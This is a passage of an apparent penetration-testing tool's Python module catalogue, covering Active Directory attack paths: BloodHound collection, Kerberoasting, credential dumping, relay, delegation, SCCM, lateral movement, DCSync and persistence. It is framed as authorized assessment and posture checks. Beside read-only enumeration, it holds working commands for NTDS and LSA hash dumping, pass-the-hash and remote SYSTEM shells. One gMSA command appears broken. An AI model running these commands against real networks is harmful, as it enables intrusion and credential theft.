"""AD Attack Architecture module layer.

These entries mirror the public AD Attack Architecture map as operator-facing
modules. They are intentionally framed as authorized assessment references and
posture checks; destructive actions stay out of default collection paths.
"""

from __future__ import annotations

from typing import Any


def _module(
    module_id: str,
    name: str,
    category: str,
    description: str,
    groups: list[dict[str, Any]],
    excluded: list[str] | None = None,
    modes: list[str] | None = None,
) -> dict[str, Any]:
    return {
        "id": module_id,
        "name": name,
        "category": category,
        "description": description,
        "supported_modes": modes or ["WINDOWS_LOCAL", "WINDOWS_REMOTE", "LINUX_REMOTE", "IMPORT"],
        "read_only": False,
        "command_groups": [
            {
                "id": g["id"],
                "name": g["name"],
                "description": g.get("description", ""),
                "commands": [
                    {"id": f"{module_id}-{i+1}-{ci+1}", "title": c[0], "command": c[1], "notes": c[2]}
                    for ci, c in enumerate(g["commands"])
                ],
            }
            for i, g in enumerate(groups)
        ],
        "excluded_capabilities": excluded or [],
    }


ARCHITECTURE_ATTACK_MODULES: list[dict[str, Any]] = [
    _module(
        "bloodhound_graph_collection",
        "BloodHound and Graph Collection",
        "graph",
        "SharpHound, bloodhound-python, BOFHound, RustHound-CE, AzureHound, trust/ACL/session collection, custom Cypher path queries, and attack-path graph ingestion.",
        [
            {
                "id": "bh-collection",
                "name": "Collection methods",
                "description": "Collector invocation for Windows and Linux.",
                "commands": [
                    ("SharpHound CE — full collection", "SharpHound.exe -c DCOnly,Group,LocalAdmin,Session,Trusts,ACL --zipfilename adbygod-bh.zip", "Full BloodHound CE collection. Use DCOnly first for low noise."),
                    ("SharpHound CE — DCOnly (low noise)", "SharpHound.exe -c DCOnly,Group,Trusts --zipfilename adbygod-bh-dc.zip", "Skips local-admin and session enumeration — minimal lateral noise."),
                    ("bloodhound-python — all methods", "bloodhound-python -d <domain> -u <user> -p <pass> -dc <dc> -c all --zip", "Linux-side full relationship collection."),
                    ("bloodhound-python — DCOnly", "bloodhound-python -d <domain> -u <user> -p <pass> -dc <dc> -c DCOnly,Group,Trusts --zip", "Lower-noise Linux collection."),
                    ("RustHound-CE collection", "rusthound-ce -d <domain> -u <user> -p <pass> --dc <dc> --zip --output /tmp/bh", "Rust-based alternative collector."),
                    ("BOFHound import from LDAP logs", "python3 BOFHound.py -i ldap_logs/ -d <domain> --type 'ldap'", "Builds BloodHound data from LDAP event logs — no live collection."),
                ],
            },
            {
                "id": "bh-azure",
                "name": "AzureHound / Entra collection",
                "description": "Azure-side graph collection for hybrid environments.",
                "commands": [
                    ("AzureHound with credentials", "azurehound -u <UPN> -p '<Password>' list --tenant <TenantID> -o azurehound.zip", "Collects Entra users, groups, roles, apps, and subscriptions."),
                    ("AzureHound with token", "azurehound -t <AccessToken> list --tenant <TenantID> -o azurehound.zip", "Token-based collection — preferred over plaintext credentials."),
                ],
            },
            {
                "id": "bh-analysis",
                "name": "BloodHound Cypher queries",
                "description": "Key analysis queries for attack path review.",
                "commands": [
                    ("Find shortest path to Domain Admins", "MATCH p=shortestPath((n)-[*1..]->(m:Group {name:'DOMAIN ADMINS@CORP.COM'})) WHERE NOT n=m RETURN p", "Core DA path analysis — run in BloodHound query editor."),
                    ("Find all kerberoastable DA paths", "MATCH (u:User {hasspn:true})-[r:MemberOf|AdminTo*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.COM'}) RETURN u.name", "High-value kerberoast targets with DA paths."),
                    ("Find unconstrained delegation hosts", "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name", "All unconstrained delegation computers in graph."),
                    ("Find owned principals with paths", "MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:'DOMAIN ADMINS@CORP.COM'})) RETURN p", "Owned nodes that have paths to DA."),
                ],
            },
        ],
        ["aggressive collection without authorization", "credential theft"],
    ),

    _module(
        "credential_access_architecture",
        "Credential Access Architecture",
        "credential-access",
        "AS-REP roasting, Kerberoasting, Timeroasting, password spraying, relay, coercion, DPAPI, LAPS/gMSA reads, LSASS/SAM/NTDS/DCC2, and cracking workflow coverage.",
        [
            {
                "id": "cred-asrep",
                "name": "AS-REP roasting surface",
                "description": "Identify pre-auth disabled accounts without requesting hashes.",
                "commands": [
                    ("Find AS-REP roastable (LDAP)", "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName", "Flags DONT_REQUIRE_PREAUTH without requesting hashes."),
                    ("Find AS-REP roastable (PowerShell)", "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,Enabled | Where-Object {$_.Enabled} | Select-Object SamAccountName,DistinguishedName", "Windows-side pre-auth disabled user inventory."),
                    ("Request AS-REP hashes (impacket)", "impacket-GetNPUsers <domain>/ -dc-ip <IP> -usersfile <UserList> -format hashcat -outputfile asrep.txt", "Requests AS-REP material for offline cracking — authorized lab only."),
                ],
            },
            {
                "id": "cred-kerberoast",
                "name": "Kerberoasting surface",
                "description": "SPN account discovery and ticket request surface.",
                "commands": [
                    ("Find Kerberoastable SPNs (impacket)", "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <IP>", "Lists SPN-bearing accounts; RC4-only encryption = easier crack."),
                    ("Find Kerberoastable SPNs (LDAP)", "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes adminCount", "Surfaces SPN accounts and encryption type from Linux."),
                    ("Find Kerberoastable SPNs (PowerShell)", "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes,adminCount | Select-Object SamAccountName,ServicePrincipalName,msDS-SupportedEncryptionTypes,adminCount", "Windows-side Kerberoast surface with encryption type."),
                    ("Request TGS tickets (authorized lab)", "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <IP> -request -outputfile kerberoast.txt", "Authorized-lab TGS ticket request for offline cracking."),
                ],
            },
            {
                "id": "cred-timeroasting",
                "name": "Timeroasting and other hash surfaces",
                "description": "Timeroasting, hash type reference, and cracking workflow.",
                "commands": [
                    ("Timeroasting — find machine accounts", "Get-ADComputer -Filter * -Properties SamAccountName,PasswordLastSet | Where-Object {$_.PasswordLastSet -lt (Get-Date).AddDays(-30)} | Select-Object SamAccountName,PasswordLastSet", "Stale machine passwords increase Timeroast feasibility."),
                    ("Hash type matrix (hashcat modes)", "NTLM:1000  Net-NTLMv1:5500  Net-NTLMv2:5600  AS-REP:18200  TGS-RC4:13100  TGS-AES:19700  DCC2:2100  DPAPI:15900", "Reference for cracking workflow and evidence labeling."),
                    ("LAPS password read (authorized)", "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime | Where-Object {$_.'ms-Mcs-AdmPwd'} | Select-Object Name,'ms-Mcs-AdmPwd'", "Read LAPS passwords where the operator account has permission."),
                    ("gMSA password read (authorized)", "Get-ADServiceAccount -Filter * -Properties msDS-ManagedPassword | Where-Object {$_.'msDS-ManagedPassword'} | ForEach-Object { $name = $_.Name; $pwd = (New-Object System.Security.Principal.SecurityIdentifier).Translate([System.Security.Principal.NTAccount]); [PSCustomObject]@{Name=$name} }", "Lists gMSA accounts with readable managed passwords."),
                ],
            },
        ],
        ["unauthorized credential dumping", "hash cracking outside approved scope"],
    ),

    _module(
        "credential_dumping_deep_dive",
        "Credential Dumping Deep Dive",
        "credential-access",
        "LSASS, SAM, NTDS.dit, DCC2 cached credentials, all-in-one app secret recovery, RemoteMonologue, SCCMDecryptor-BOF, and goLAPS coverage.",
        [
            {
                "id": "dump-signals",
                "name": "Evidence classification and posture checks",
                "description": "Classify dump surface and review RunAsPPL / Credential Guard state before extraction.",
                "commands": [
                    ("Check RunAsPPL state", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL", "1 or 2 means LSASS is PPL-protected — standard tools will fail."),
                    ("Check Credential Guard state", "Get-CimInstance -ClassName Win32_DeviceGuard | Select-Object SecurityServicesRunning,VirtualizationBasedSecurityStatus", "LSAIso (value 2 in SecurityServicesRunning) = Credential Guard active."),
                    ("Check WDigest registry", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential", "1 = WDigest enabled, cleartext credentials cached in LSASS."),
                    ("LSASS process token", "Get-Process lsass | Select-Object Id,Name,HandleCount,WorkingSet", "PID for reference; check PPL before any memory access."),
                ],
            },
            {
                "id": "dump-sam-ntds",
                "name": "SAM, NTDS, and LSA secrets (authorized lab)",
                "description": "Remote and local extraction of SAM/NTDS/LSA in approved environments.",
                "commands": [
                    ("secretsdump remote SAM+LSA", "impacket-secretsdump <domain>/<user>:<pass>@<IP> -just-dc-user <target>", "Remote SAM/LSA/NTDS dump over SMB — authorized DC access only."),
                    ("secretsdump full NTDS.dit", "impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc", "Dumps all domain hashes from NTDS.dit via DRSUAPI — authorized only."),
                    ("secretsdump local SAM (volume shadow)", "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL", "Parse offline SAM/SYSTEM/SECURITY copies from shadow copy."),
                    ("nxc SAM dump", "nxc smb <IP> -u <user> -p <pass> --sam", "Dumps local SAM hashes via nxc — requires local admin."),
                    ("nxc LSA dump", "nxc smb <IP> -u <user> -p <pass> --lsa", "Dumps LSA secrets including service account credentials."),
                ],
            },
            {
                "id": "dump-cached-secrets",
                "name": "DCC2 and application credential stores",
                "description": "Cached credentials and application secret artifact inventory.",
                "commands": [
                    ("DCC2 registry check", "reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' /v CachedLogonsCount", "Shows number of DCC2 cached credentials (default 10)."),
                    ("LaZagne all credential stores", "laZagne.exe all", "Recovers credentials from Windows apps, browsers, mail, Wi-Fi, Credential Manager — authorized host only."),
                    ("goLazagne (Linux)", "goLazagne", "Linux-side credential store recovery from browser and app secrets."),
                    ("Credential Manager dump (cmdkey)", "cmdkey /list", "Lists stored Credential Manager entries (run as target user)."),
                    ("Wi-Fi profile passwords", "netsh wlan show profile name=<SSID> key=clear", "Recovers stored Wi-Fi PSK — useful for lateral access to network equipment."),
                ],
            },
        ],
        ["automatic credential dumping", "automatic cracking on page load", "cracking without explicit authorized-use acknowledgement"],
    ),

    _module(
        "coercion_relay_architecture",
        "Coercion and Relay Architecture",
        "credential-access",
        "PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, WebDAV coercion, Kerberos CNAME relay, reflective relay, NTLM relay paths, LLMNR/NBT-NS/mitm6, and file-drop hash capture.",
        [
            {
                "id": "coercion-surface",
                "name": "Coercion surface enumeration",
                "description": "Identify coercion-capable services without triggering coercion.",
                "commands": [
                    ("Check Print Spooler on DCs", "Get-ADDomainController -Filter * | ForEach-Object { Get-Service -ComputerName $_.Name -Name Spooler -ErrorAction SilentlyContinue } | Select-Object MachineName,Status", "Spooler on DCs enables PrinterBug/MS-RPRN coercion."),
                    ("Check Print Spooler (remote, nxc)", "nxc smb <IP/CIDR> -u <user> -p <pass> -M spooler", "Bulk spooler check across subnet via nxc."),
                    ("Check WebClient service (Windows)", "Get-Service WebClient | Select-Object Status,StartType", "WebClient running = HTTP relay path via coercion (PetitPotam+WebDAV)."),
                    ("Check WebClient (nxc)", "nxc smb <IP/CIDR> -u <user> -p <pass> -M webdav", "Bulk WebClient state check across subnet."),
                    ("Coercer scan mode (no coercion)", "Coercer scan -t <IP> -u <user> -p <pass> -d <domain>", "Identifies vulnerable coercion protocols — no actual coercion triggered."),
                ],
            },
            {
                "id": "relay-mitigations",
                "name": "Relay mitigation posture",
                "description": "Check for SMB signing, LDAP signing, channel binding, and EPA.",
                "commands": [
                    ("SMB signing — nmap", "nmap -Pn -p445 --script smb2-security-mode <IP/CIDR>", "Identifies 'Message signing enabled but not required' (relay-vulnerable)."),
                    ("SMB signing — nxc", "nxc smb <IP/CIDR> -u <user> -p <pass> --gen-relay-list relay_targets.txt", "Generates list of SMB relay targets — all hosts with signing disabled."),
                    ("LDAP signing requirement", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LDAPServerIntegrity", "2 = required; 1 = negotiated; 0 = none. Relay requires signing disabled."),
                    ("LDAP channel binding", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LdapEnforceChannelBinding", "2 = always enforced; 1 = when supported; 0 = never."),
                    ("Check NTLM relay via Responder (authorized)", "python3 Responder.py -I <interface> -A", "Analyze mode — logs NTLM auth without actively poisoning. Authorized only."),
                    ("Check IPv6/mitm6 exposure", "python3 mitm6.py -d <domain> --ignore-nofqdn -r", "Dry-run mode maps IPv6 DHCP exposure without relay. Authorized only."),
                ],
            },
        ],
        ["live coercion against unapproved systems", "active poisoning", "live relay execution"],
    ),

    _module(
        "delegation_abuse_architecture",
        "Delegation Abuse Architecture",
        "privilege-escalation",
        "Unconstrained delegation, constrained delegation with/without protocol transition, RBCD, S4U2Self, S4U2Proxy, SPN swap, KrbRelayUp, and krbrelayx chains.",
        [
            {
                "id": "delegation-enum-windows",
                "name": "Windows delegation enumeration",
                "description": "Full delegation visibility via PowerShell and AD module.",
                "commands": [
                    ("Find unconstrained delegation (computers)", "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,DNSHostName,OperatingSystem | Select-Object Name,DNSHostName,OperatingSystem", "High impact when paired with coercion — DC excluded by default."),
                    ("Find unconstrained delegation (users)", "Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object SamAccountName,DistinguishedName", "User accounts with unconstrained delegation — unusual and high-risk."),
                    ("Find constrained delegation (msDS-AllowedToDelegateTo)", "Get-ADObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties msDS-AllowedToDelegateTo,SamAccountName,ObjectClass | Select-Object SamAccountName,ObjectClass,msDS-AllowedToDelegateTo", "Constrained delegation — check for 'any authentication protocol' flag."),
                    ("Find protocol transition (TrustedToAuthForDelegation)", "Get-ADObject -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=16777216)' -Properties SamAccountName,msDS-AllowedToDelegateTo | Select-Object SamAccountName,msDS-AllowedToDelegateTo", "Protocol transition allows S4U2Self — impersonation without user TGT."),
                    ("Find RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)", "Get-ADObject -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' -Properties SamAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object SamAccountName", "RBCD edges — who can impersonate to these objects."),
                ],
            },
            {
                "id": "delegation-enum-linux",
                "name": "Linux delegation enumeration",
                "description": "Cross-platform delegation discovery via LDAP.",
                "commands": [
                    ("Find unconstrained delegation (LDAP)", "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName dNSHostName userAccountControl", "Bit 524288 = TrustedForDelegation."),
                    ("Find constrained delegation (LDAP)", "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo userAccountControl", "SPN targets allowed for constrained delegation."),
                    ("Find RBCD (LDAP)", "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' cn sAMAccountName", "Objects with RBCD configured."),
                    ("Check MachineAccountQuota (LDAP)", "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' -s base '(objectClass=domain)' ms-DS-MachineAccountQuota", "MAQ > 0 allows any user to create machine accounts for RBCD abuse."),
                ],
            },
        ],
        ["impersonation", "S4U ticket requests", "RBCD writes"],
    ),

    _module(
        "adidns_architecture",
        "ADIDNS and DNS Abuse",
        "infrastructure",
        "AD-integrated DNS enumeration, CNAME relay, poisoning, wildcard records, record injection, ADIDNS time-bomb tracking, and stale record discovery.",
        [
            {
                "id": "adidns-enum",
                "name": "ADIDNS zone enumeration",
                "description": "Dump and review AD-integrated DNS zones for suspicious records.",
                "commands": [
                    ("adidnsdump — full zone dump", "adidnsdump -u '<domain>\\<user>' ldap://<dc> --print-zones", "Authorized zone inventory including tombstoned records."),
                    ("adidnsdump — single zone", "adidnsdump -u '<domain>\\<user>' ldap://<dc> -z <zone>", "Dump specific DNS zone for review."),
                    ("dnstool query existing record", "python3 dnstool.py --record <name> --action query --zone <zone> <dc>", "Check if a DNS record already exists before any write."),
                    ("List DNS zones via PowerShell", "Get-DnsServerZone | Select-Object ZoneName,ZoneType,IsDsIntegrated,IsAutoCreated", "Lists all server zones including AD-integrated — run on DC."),
                    ("Dump zone via PowerShell", "Get-DnsServerResourceRecord -ZoneName <zone> | Select-Object HostName,RecordType,RecordData | Sort-Object HostName", "Full zone record inventory from DC."),
                    ("List DNS zones via LDAP", "ldapsearch -x -H ldap://<IP> -b 'DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,DC=corp,DC=com' '(objectClass=dnsNode)' name dnsRecord", "Raw LDAP DNS zone dump."),
                    ("Find wildcard records", "Get-DnsServerResourceRecord -ZoneName <zone> | Where-Object {$_.HostName -eq '*'}", "Wildcard DNS records can enable coercion relay chains."),
                    ("Find stale DNS records (>90 days)", "Get-DnsServerResourceRecord -ZoneName <zone> | Where-Object {$_.TimeStamp -and $_.TimeStamp -lt (Get-Date).AddDays(-90)} | Select-Object HostName,RecordType,TimeStamp", "Stale records can be hijacked by re-registration."),
                ],
            },
        ],
        ["DNS poisoning", "record injection", "wildcard record creation"],
    ),

    _module(
        "sccm_architecture",
        "SCCM Attack Surface",
        "enterprise-management",
        "SCCM enumeration, NAA credentials, task sequences, PXE, SCCMDecryptor-BOF, site-server relay, TAKEOVER 1-9, and deployment abuse coverage.",
        [
            {
                "id": "sccm-discovery",
                "name": "SCCM infrastructure discovery",
                "description": "Locate SCCM components from AD and network.",
                "commands": [
                    ("sccmhunter — find infrastructure", "sccmhunter find -u <user> -p <pass> -d <domain> -dc-ip <IP>", "Locates management points, site servers, and distribution points."),
                    ("sccmhunter — SMB enumerate", "sccmhunter smb -u <user> -p <pass> -d <domain> -dc-ip <IP>", "Enumerates SCCM shares and network access points."),
                    ("Find SCCM site server (AD SCP)", "Get-ADObject -SearchBase 'CN=System Management,CN=System,DC=corp,DC=com' -Filter * -Properties *", "SCCM registers the site server in the System Management container."),
                    ("Find SCCM management points (DNS)", "nslookup -type=SRV _sccm._tcp.<domain>", "Discovers management points via DNS SRV records."),
                    ("Find SCCM via nmap", "nmap -Pn -p 80,443,8530,8531,10123 <IP>", "HTTP(S) and SCCM-specific ports for infrastructure mapping."),
                ],
            },
            {
                "id": "sccm-credential-surface",
                "name": "SCCM credential store posture",
                "description": "NAA, task sequence, PXE, and WMI credential exposure checks.",
                "commands": [
                    ("Check NAA account via WMI", "Get-WmiObject -Namespace root\\ccm\\policy\\machine\\ActualConfig -Class CCM_NetworkAccessAccount", "Reads NAA account name from SCCM client WMI — run on SCCM client."),
                    ("Check PXE password protection", "sccmhunter pxe -u <user> -p <pass> -d <domain> -dc-ip <IP>", "PXE without password = unauthenticated task-sequence credential extraction."),
                    ("List SCCM site boundaries", "sccmhunter show -u <user> -p <pass> -d <domain> -dc-ip <IP> -show boundaries", "Site boundary configuration for coverage analysis."),
                    ("Find SCCM device collections (SMB)", "sccmhunter show -u <user> -p <pass> -d <domain> -dc-ip <IP> -show collections", "Collection visibility for deployment abuse surface analysis."),
                    ("Check SCCM client registry", "reg query 'HKLM\\SOFTWARE\\Microsoft\\SMS\\Mobile Client' /v CurrentManagementPoint", "Identifies the management point from the SCCM client — run on managed host."),
                ],
            },
        ],
        ["unauthorized software deployment", "credential extraction outside scope", "PXE exploitation"],
    ),

    _module(
        "lateral_movement_architecture",
        "Lateral Movement Architecture",
        "lateral-movement",
        "Remote execution, PsExec/WMI/SMBExec, WinRM/RDP, PtH, PtT, OPtH, Pass-the-Cert, SCShell, DCOM, RDP hijacking, SQL linked servers, and Exchange paths.",
        [
            {
                "id": "lat-exposure",
                "name": "Lateral movement service exposure",
                "description": "Enumerate remote management services without execution.",
                "commands": [
                    ("Scan WinRM and RDP exposure", "nmap -Pn -p 3389,5985,5986 -sV <IP/CIDR>", "Maps RDP and WinRM exposure across target range."),
                    ("Check WinRM listener", "winrm enumerate winrm/config/listener", "Lists WinRM interfaces and auth methods — run on target."),
                    ("Check RDP enabled", "reg query 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections", "0 = RDP enabled on target host."),
                    ("Scan SMB and WMI ports", "nmap -Pn -p 135,139,445,47001 -sV <IP/CIDR>", "Maps SMB, RPC endpoint mapper, and WinRM HTTP ports."),
                    ("Test WinRM access (nxc)", "nxc winrm <IP/CIDR> -u <user> -p <pass>", "Confirms WinRM access with credentials — no command execution."),
                    ("Test SMB access (nxc)", "nxc smb <IP/CIDR> -u <user> -p <pass>", "Confirms SMB access and lists host info."),
                ],
            },
            {
                "id": "lat-exec-references",
                "name": "Remote execution references (authorized lab)",
                "description": "Execution technique references for approved lab environments.",
                "commands": [
                    ("PsExec shell (impacket)", "impacket-psexec <domain>/<user>:<pass>@<IP>", "SYSTEM shell via SMB service install — leaves service artifacts."),
                    ("WMIExec shell (impacket)", "impacket-wmiexec <domain>/<user>:<pass>@<IP>", "Semi-interactive shell via WMI — lower artifact footprint than PsExec."),
                    ("SMBExec shell (impacket)", "impacket-smbexec <domain>/<user>:<pass>@<IP>", "SYSTEM shell via SMB scheduled-command execution."),
                    ("WinRM shell (evil-winrm)", "evil-winrm -i <IP> -u <user> -p '<pass>'", "Full PowerShell WinRM session with script upload capability."),
                    ("Pass-the-Hash PsExec", "impacket-psexec <domain>/<user>@<IP> -hashes :<NT_HASH>", "NTLM hash authentication — authorized lab use only."),
                    ("Pass-the-Hash WMIExec", "impacket-wmiexec <domain>/<user>@<IP> -hashes :<NT_HASH>", "WMI execution with hash — no plaintext password needed."),
                    ("Pass-the-Ticket WinRM", "KRB5CCNAME=<ticket.ccache> evil-winrm -i <IP> -r <domain>", "Kerberos ticket-based WinRM authentication."),
                ],
            },
        ],
        ["remote code execution without authorization", "credential reuse against unapproved hosts"],
    ),

    _module(
        "domain_dominance_architecture",
        "Domain Dominance and Ticket Forgery",
        "domain-dominance",
        "DCSync, NTDS dump, Golden/Diamond/Sapphire/Silver tickets, ExtraSID, trust tickets, rogue certificates, GoldenGMSA, forest pivots, and forest takeover references.",
        [
            {
                "id": "domdom-prereqs",
                "name": "Dominance prerequisite checks",
                "description": "Check DCSync rights, krbtgt hygiene, and trust SID filtering before lab validation.",
                "commands": [
                    ("Check DCSync rights on domain root", "(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object { $_.ObjectType -in @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ab-9c07-11d1-f79f-00c04fc2dcd2','89e95b76-444d-4c62-991a-0facbeda640c') } | Select-Object IdentityReference,ActiveDirectoryRights,ObjectType", "Exact OIDs for DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, and filtered-set replication."),
                    ("Check DCSync rights (impacket)", "impacket-dacledit <domain>/<user>:<pass>@<DC_IP> -action read -target-dn 'DC=corp,DC=com' | grep -i Replication", "Linux-side DCSync right review."),
                    ("Check krbtgt password age", "Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object SamAccountName,PasswordLastSet", "krbtgt > 180 days old = Golden Ticket risk window still open."),
                    ("Check krbtgt AES keys enrolled", "Get-ADUser krbtgt -Properties msDS-SupportedEncryptionTypes | Select-Object msDS-SupportedEncryptionTypes", "AES-only enforcement reduces Golden Ticket usability."),
                    ("Check SID filtering on trusts", "Get-ADTrust -Filter * -Properties SIDFilteringForestAware,SIDFilteringQuarantined | Select-Object Name,SIDFilteringForestAware,SIDFilteringQuarantined,TrustType", "SID filtering disabled = ExtraSID/cross-forest ticket risk."),
                    ("Find GoldenGMSA exposure (msDS-GroupMSAMembership)", "Get-ADObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)' -Properties msDS-GroupMSAMembership,msDS-ManagedPassword | Select-Object Name", "Readable gMSA password + KDS root key access = GoldenGMSA."),
                ],
            },
            {
                "id": "domdom-ntds",
                "name": "NTDS and DCSync (authorized lab)",
                "description": "Domain hash extraction in approved lab environments.",
                "commands": [
                    ("DCSync single account (impacket)", "impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc-user <target_user>", "Single-account DCSync — minimal scope for authorized testing."),
                    ("DCSync full domain (impacket)", "impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc -outputfile ntds_dump", "Full domain hash extraction via DRSUAPI — authorized DC lab only."),
                    ("NTDS via volume shadow copy (authorized)", "ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\ifm' q q && impacket-secretsdump -ntds C:\\ifm\\Active\\ Directory\\ntds.dit -system C:\\ifm\\registry\\SYSTEM LOCAL", "IFM-based NTDS extraction — requires DC admin access."),
                ],
            },
        ],
        ["ticket forgery against production systems", "unsanctioned DCSync", "forest takeover"],
    ),

    _module(
        "persistence_architecture",
        "Persistence Architecture",
        "host-persistence",
        "AdminSDHolder, GPO backdoors, machine-account persistence, ADIDNS time bombs, Golden Certificate, Skeleton Key, DCShadow, DSRM, custom SSP, and SIDHistory persistence.",
        [
            {
                "id": "persist-adminsdholder",
                "name": "AdminSDHolder and protected objects",
                "description": "Detect ACL propagation backdoors on protected objects.",
                "commands": [
                    ("Read AdminSDHolder ACL", "(Get-Acl 'AD:\\CN=AdminSDHolder,CN=System,DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|Administrators|SYSTEM|CREATOR OWNER'} | Select-Object IdentityReference,ActiveDirectoryRights", "Non-default ACEs propagate to all adminCount=1 objects every 60 min."),
                    ("List adminCount=1 objects", "Get-ADObject -LDAPFilter '(adminCount=1)' -Properties SamAccountName,ObjectClass | Select-Object SamAccountName,ObjectClass,DistinguishedName | Sort-Object ObjectClass", "All objects under AdminSDHolder protection."),
                    ("Check SDProp interval", "Get-ADObject -Identity 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=com' -Properties AdminSDProtectFrequency | Select-Object AdminSDProtectFrequency", "Default 3600 seconds (60 min); lower = faster backdoor propagation."),
                ],
            },
            {
                "id": "persist-gpo-sysvol",
                "name": "GPO and SYSVOL backdoor surfaces",
                "description": "GPO modification history and SYSVOL script inventory.",
                "commands": [
                    ("List GPO modification times", "Get-GPO -All | Select-Object DisplayName,Id,ModificationTime,UserVersion,ComputerVersion | Sort-Object ModificationTime -Descending", "Recently modified GPOs are a backdoor signal."),
                    ("Find GPO scheduled tasks (SYSVOL)", "Get-ChildItem -Path '\\\\<domain>\\SYSVOL\\<domain>\\Policies' -Recurse -Filter 'ScheduledTasks.xml' | Select-Object FullName,LastWriteTime", "Malicious scheduled tasks in SYSVOL GPO folders."),
                    ("Find GPO startup scripts (SYSVOL)", "Get-ChildItem -Path '\\\\<domain>\\SYSVOL\\<domain>\\Policies' -Recurse -Include '*.ps1','*.bat','*.vbs' | Select-Object FullName,LastWriteTime,Length", "Logon/startup script abuse in GPO."),
                    ("Find logon script paths", "Get-ADUser -Filter * -Properties ScriptPath | Where-Object {$_.ScriptPath} | Select-Object SamAccountName,ScriptPath", "Per-user logon scripts that may have been modified for persistence."),
                ],
            },
            {
                "id": "persist-sidhistory-dsrm",
                "name": "SIDHistory and DSRM posture",
                "description": "Detect SIDHistory persistence and DSRM password abuse risk.",
                "commands": [
                    ("Find accounts with SIDHistory", "Get-ADObject -LDAPFilter '(sIDHistory=*)' -Properties SamAccountName,sIDHistory | Select-Object SamAccountName,sIDHistory", "SIDHistory can grant shadow privileges from previous domain memberships."),
                    ("Check DSRM admin password sync", "reg query 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' /v DsrmAdminLogonBehavior", "2 = DSRM account usable over network — backdoor risk."),
                    ("Check CA certificate count and age", "certutil -CA.cert | findstr 'Issuer Expires'", "Golden Certificate requires CA private key access — review CA backup controls."),
                ],
            },
        ],
        ["backdoor deployment", "LSASS patching", "DCShadow replication writes"],
    ),

    _module(
        "ad_cve_architecture",
        "Notable AD CVE Coverage",
        "vulnerability",
        "ZeroLogon, PrintNightmare, noPac, Certifried, MS17-010, CVE-2025-24071, ESC8, and NTLM relay CVE posture checks.",
        [
            {
                "id": "cve-netlogon",
                "name": "ZeroLogon and Netlogon posture",
                "description": "CVE-2020-1472 patch and enforcement mode checks.",
                "commands": [
                    ("Check Netlogon enforcement mode", "reg query 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters' /v FullSecureChannelProtection", "1 = enforcement mode active; 0 or missing = still vulnerable window."),
                    ("Check ZeroLogon patch (WMI)", "Get-HotFix -Id KB4571694,KB4565503,KB4571723 | Select-Object HotFixID,InstalledOn", "August 2020 patches that closed CVE-2020-1472."),
                    ("Check Netlogon secure channel", "nltest /sc_verify:<domain>", "Verifies machine secure channel — broken channel may indicate exploit attempt."),
                ],
            },
            {
                "id": "cve-spooler-printing",
                "name": "PrintNightmare posture",
                "description": "CVE-2021-1675 / CVE-2021-34527 patch and PointAndPrint review.",
                "commands": [
                    ("Check Print Spooler service", "Get-Service Spooler | Select-Object Status,StartType,Name", "Spooler running on DCs is a critical risk — should be disabled."),
